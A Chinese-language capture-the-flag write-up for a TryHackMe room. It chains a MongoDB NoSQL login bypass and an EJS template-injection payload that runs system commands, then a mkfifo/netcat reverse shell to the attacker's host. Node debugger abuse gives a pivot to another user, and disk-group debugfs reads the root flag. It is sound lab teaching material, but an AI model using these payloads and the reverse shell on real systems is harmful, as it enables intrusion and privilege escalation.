---
title: 'Write-up: HH2026 - Do Not Disturb'
categories:
  - 网络安全
tags:
  - TryHackMe
  - Hacker Holidays 2026
  - Boot2Root
date: 2026-08-08 06:33:36
---


## 0x0 前言

- **名字**：[Hacker Holidays 2026 - Day 7 - Do Not Disturb](https://tryhackme.com/room/hh-donotdisturb-84a45644)
- **平台**：TryHackMe
- **难度**：中等
- **分类**：Boot2Root
- **包含元素**：
	- NoSQL 注入
	- SSTI
	- Node 调试器滥用
	- Linux disk 组提权

### 题目

门上挂着“请勿打扰”的牌子，房间内有活跃会话。你拥有本不该给你的访问权限，而他也一样。

异常现象已不再是异常：一张日光浴床上的会话突然变为活跃，一个陌生人坐了上去；一个钱包签署了一笔其主人并未授权的交易；海滩上的一个贝壳居然做出了回应。于是，情况变得清晰——那个已经潜入其中的人，比你早行动了太久。

Byte Lotus 的池畔平台记录着每一间小屋、每一张日光浴床、每一次活跃会话。Byte Lotus 从不遗忘。有人已经进去了。跟随他的足迹，沿着他攀爬的路径，找回两面旗帜。

<details>
<summary>点击查看题目原文</summary>

Sign's on the door. Room's active. You have access you were never given, and so does he.

The anomalies stop being anomalies: a session goes warm on a sunbed, and a stranger sits down in it, a wallet signs a transaction its owner didn't authorise, a shell on the beach answers back. And it becomes clear that whoever's already inside has been moving for far longer than you have.

The Byte Lotus poolside platform tracks every cabana, every sunbed, every warm session. Byte Lotus never forgets. Someone is already inside. Follow his footprints in, climb the way he climbed, and recover both flags.

</details>

这是一个难度标为 中等 的房间，难度终于上来了。

## 0x1 信息搜集

### 前端分析

前端只呈现一个 Byte Lotus 酒店的登录表单，用户名输入框的提示为 `attendant`。

右键查看页面源码，未发现注释和其他明显突破口。

![](/img/write-up/wp-do-not-disturb-1.png)

### 题目分析

>The Byte Lotus poolside platform tracks every cabana, every sunbed, every warm session. Byte Lotus never forgets.

说明题目可能涉及 Session 相关。Session 生命周期的管理不当，导致允许 Session 被复用或其他问题。

> Someone is already inside. Follow his footprints in, climb the way he climbed, and recover both flags.

可能指的是站点已经被 compromised，可以使用这个 attendant 账号获得权限？暂作留存（

### HTTP 标头检查

```bash
curl -v IP
```

存在字段：

- `X-Powered-By: Express`

可以推测站点使用了 Express.js 作为框架。

### 子目录枚举

feroxbuster 扫描：

```bash
feroxbuster -u 'IP' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 70 --scan-dir-listings
```

发现存在 `/staff`，返回 403，仅限有权限的访问，暂作留存。

### 开放端口枚举

nmap 扫描

```bash
sudo nmap -sS -p- -T4 IP
```

开放端口：

- 22
- 80

## 0x2 初始访问：NoSQL 注入

目标站点使用 Express.js，可以猜测技术栈大概率为 MERN，数据库可能使用 MongoDB，尝试用 NoSQL 注入验证。

使用 Firefox 的 dev tools，可以很轻松的观察请求内容，修改并重放请求。

`Inspect -> Network -> 右键请求 -> Edit and Resend`

随便填用户名和密码，点击 Sign In，可以观察到 `/login` POST 请求 Body 的结构为：

```bash
username={USER}&password={PASS}
```

尝试通用的 NoSQL 盲注-身份验证绕过的 payload：

```bash
username[$ne]=null&password[$ne]=null
```

重放请求后，返回了一个 302 跳转，目标为 `/staff`，并下发了 cookie。
将 cookie 填入浏览器并访问 `/staff` 后，仍然是 `403 Staff access only`。

![](/img/write-up/wp-do-not-disturb-2.png)

这可能说明注入存在，但是匹配到的第一个用户并不具有 staff 权限。尝试使用 `attendant` 作为用户名进行注入。

```bash
username=attendant&password[$ne]=null
```

重复上述步骤后，就可以获得 `/staff` 的访问了。

## 0x3 SSTI

访问 `/staff` 并观察页面。

从 `Confirmation template`，EJS，和输入框中的 `<%= guest %>` 在 Preview 中被解析成用户名 `attendant`，可得知这可能存在 SSTI 模版注入。

![](/img/write-up/wp-do-not-disturb-3.png)

使用非常经典的 `7 * 7` payload，点击 Preview 后也是成功地被解析成 49， 说明确实存在 SSTI。

随后可以使用如下 payload 执行系统命令：

```js
<%= (function(){ return process.getBuiltinModule('child_process').execSync('COMMAND').toString(); })() %>
```

因为 `require('child_process')` 在目标上无法使用，在这里我用了 `process.getBuiltinModule('child_process')` 来获取 Node 应用的 child process 模块。这样就可以用 child process 模块的 `execSync('COMMAND').toString()` 来执行系统命令，并返回命令的结果了。

![](/img/write-up/wp-do-not-disturb-4.png)

接下来就是收集信息，可以用如下系统命令：

- `id` 查当前用户：`poolside`
- `ls /home` 查存在用户：`poolside`, `pipelinesvc`
- `pwd` 查所在路径：/opt/poolside

使用 `ls /home/poolside` 定位到 `user.txt`。
并用 `cat /home/poolside/user.txt` 拿到第一个 flag。

![](/img/write-up/wp-do-not-disturb-5.png)

## 0x4 内网侦查

拿到了对内网的初始访问和第一个 flag 之后，就可以进行内网侦查，寻找路径进行提权了。

**（为了便于阅读，下文所列命令均已去掉 SSTI 模板包裹，请在实际利用时自行包裹。）**

查看所有正在运行的服务：

```bash
systemctl list-units --type=service --state=running
```

检查服务列表，可以看到有两个正在运行的服务和本房间有关：

- `lotus-telemetry.service` - 运行着 Byte Lotus 酒店的遥测服务
- `poolside.service` - 运行着 Byte Lotus 酒店池畔平台的前端（当前网站）

![](/img/write-up/wp-do-not-disturb-6.png)

查看遥测服务的状态：

```bash
systemctl status lotus-telemetry.service
```

可以看到这也是一个 Node 应用，入口文件位于 `processor.js` 这个 JS 文件，并且使用了 `--inspect=127.0.0.1:9229` 这个 flag。
查询 Node.JS 文档可知，`--inspect` 是用来启用 Node 应用的调试功能的。

![](/img/write-up/wp-do-not-disturb-7.png)

查看 `lotus-telemetry.service` 服务的配置文件：

```bash
systemctl cat lotus-telemetry.service
```

获得了更多的有用信息

- 指定工作目录为 `/opt/pipelinesvc/telemetry`
- `User` 和 `Group` 都为 `pipelinesvc`

这说明服务是以 `pipelinesvc` 用户身份运行的，并且 `processor.js` 位于工作目录内。

![](/img/write-up/wp-do-not-disturb-8.png)

工作目录：
![](/img/write-up/wp-do-not-disturb-9.png)

`processor.js` 源码：
![](/img/write-up/wp-do-not-disturb-10.png)

工作目录内没找到有用的线索。`processor.js` 看上去也只是一个检测并记录系统平均负载的日志记录器，不存在输入。

回到这个服务运行所使用的用户 `pipelinesvc`，说不定这个用户有什么特殊权限，可以进行利用呢。

使用 `id` 查看用户所在组：

```bash
id pipelinesvc
```

发现这个用户除了拥有自己的私有用户组，还加入了 Linux 的 disk 组。

```bash
uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
```

这是非常危险的，因为处在 disk 组的用户拥有了对系统的原始块设备的读写权限。
这时候就可以利用 Node 的调试功能，和这个高权限相结合，来读取盘上的 `root.txt` flag。

## 0x5 提权

要连上目标本地的 Node 应用的调试，首先我们需要一个 shell。

在本机开启监听器：

```bash
nc -nlvp PORT
```

使用 SSTI 配合如下命令，创建一个非常经典的 pipe reverse shell：

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc IP 9001 >/tmp/f
```

可以看到连接成功建立。

![](/img/write-up/wp-do-not-disturb-11.png)

使用如下命令进入目标 Node 应用的调试，并进入目标的 REPL（交互式解释器）。

```bash
node inspect 127.0.0.1:9229
repl
```

![](/img/write-up/wp-do-not-disturb-12.png)

随后通过 child process 直接执行系统命令：

```js
process.getBuiltinModule('child_process').execSync('COMMAND').toString()
```

**（为了便于阅读，下文所列命令均已去掉 child process 调用链包裹，请在实际利用时自行包裹。）**

使用 `id` 来二次确认 `processor.js` 启动的 Node 应用是以 `pipelinesvc` 的用户权限执行的。

![](/img/write-up/wp-do-not-disturb-13.png)

使用以下命令寻找根目录所在的块设备：

- `df -h`
- `lsblk`
- `mount | grep " / "`

用 `mount` 命令确认了 `/` 目录是挂载在 `/dev/nvme0n1p1` 设备上的。

![](/img/write-up/wp-do-not-disturb-14.png)

知道了设备名，就可以使用 `debugfs` 命令通过块设备来读取存在 `/root/root.txt` 的第二个 flag 了。
通过阅读 [`debugfs`](https://man7.org/linux/man-pages/man8/debugfs.8.html) 的 man 手册，即可知道这个命令的用法。指定块设备，并用 `-R` 执行 `cat` 命令读取 `root.txt`。

```bash
debugfs -R "cat /root/root.txt" /dev/nvme0n1p1
```

![](/img/write-up/wp-do-not-disturb-15.png)

## 0x6 结语

这是一个内容挺足的房间，也学到了很多东西（

需要注意的是，连接至目标 Node 应用的调试客户端后，需要进入 REPL，才是目标 Node 应用的交互式 shell。因为使用 `node inspect` 时，Node 会新创建一个进程作为调试 cli 的进程，所使用的用户上下文为当前的用户（`poolside`）。只有在进入目标 Node 应用的 REPL 后，用户上下文才会切换至目标应用所运行的用户（`pipelinesvc`）。
